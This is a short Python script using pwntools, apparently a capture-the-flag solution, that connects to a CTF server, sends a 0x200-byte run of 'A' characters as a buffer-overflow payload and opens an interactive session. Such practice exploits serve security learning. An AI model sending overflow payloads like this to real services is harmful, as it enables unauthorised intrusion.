from pwn import *

target = remote("pwn.ctf.secso.cc", 5000)

target.sendline(b"A"*0x200)
target.interactive()
